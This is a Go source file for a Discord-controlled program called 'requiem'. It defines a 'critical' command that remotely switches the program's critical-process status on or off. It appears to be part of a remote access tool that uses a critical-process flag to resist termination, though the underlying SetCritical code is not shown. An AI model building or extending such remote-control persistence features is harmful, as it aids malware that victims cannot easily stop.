package commands

import (
	"requiem/funcs"
	"requiem/utils"
	"strings"

	"github.com/bwmarrin/discordgo"
)

func (*CriticalCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")

	set := false

	if utils.HasFlag(content, "on") {
		set = funcs.SetCritical(true)
	} else if utils.HasFlag(content, "off") {
		set = funcs.SetCritical(false)
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid argument.", msg.Reference())
		return
	}

	if set {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully set as critical.", msg.Reference())
	} else {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to set as critical.", msg.Reference())
	}
}

func (*CriticalCommand) Name() string {
	return "critical"
}

func (*CriticalCommand) Info() string {
	return "Makes requiem a critical process."
}

type CriticalCommand struct{}
